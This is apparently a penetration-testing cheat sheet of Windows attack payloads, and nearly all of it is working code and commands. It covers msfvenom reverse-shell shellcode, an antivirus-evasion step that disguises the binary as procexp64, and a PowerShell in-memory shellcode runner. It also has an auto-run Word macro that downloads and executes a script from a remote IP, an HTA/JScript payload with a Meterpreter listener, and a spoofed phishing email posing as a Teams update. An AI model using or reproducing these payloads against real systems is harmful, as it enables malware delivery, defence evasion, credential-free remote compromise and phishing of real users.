# Payloads

* [Bypass MS Defender](#bypass-ms-defender)
* [Reverse Shell MS Word Macro (Detected)](#reverse-shell-ms-word-macro-detected) 
* [C# Phishing Payload with HTA and JScript](#csharp-payload-with-hta-and-jscript)

# Bypass MS Defender 

Generate Shellcode for C#

```shell
python3 shellcodeCrypter-msfvenom.py kali 443 xor cs 250 windows/x64/meterpreter/reverse_http
```

Clone the [Shellcode Process Injector](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Injector) project and copy the previous shellcode at buf variable. `Build` -> `Batch Build` -> `Select a Build` -> Click on `Build` .

Rename the final executable. Use offical appilcation names like: procexp64

```shell
.\procexp64.exe
```

# Reverse Shell MS Word Macro (Detected)

Complete PowerShell script for in-memory shellcode runner

```powershell
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
	@($moduleName)), $functionName))
}

function getDelegateType {
	Param (
	[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
	[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
	$type.DefineConstructor('RTSpecialName, HideBySig, Public',	[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType ([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc, ...
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

Generate the reverse shell payload

```shell
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.203 LPORT=443 EXITFUNC=thread -f ps1
```

Create a macro that executes a PS in-memory

```vb
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.0.203/run.ps1') | IEX"
    Shell str, vbHide
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
```

# C# Payload with HTA and JScript

> Create a C# payload with MSFVenom

```shell
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=kali LPORT=443 EXITFUNC=thread -f csharp
```

> Clone [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) project and replace MSFVenom output in the buf variable. Then build the solution.
After building, create the JScript payload.

```shell
DotNetToJScript.exe ExampleAssembly.dll --lang=JScript --ver=v4 -o payload.js
```

> Create a skeleton .HTA file with JScript tags. When the victim clicks on the link, the file will be downloaded and executed in-memory.

```js
<head>
<script language="JScript">
<Generated payload.js JScript Content Here>
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

> Listen with multi/handler meterpreter

```shell
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_http
set lhost kali
set lport 443
run
```

> Send phishing email. Remember to host the resource.

```shell
sendemail -f administrator@domain.com -t jose@domain.com -s 192.168.0.203 -u "URGENT - Important Teams Update" -m "Please click on this link to update Teams - http://192.168.0.203/teamsHTA.hta"
```

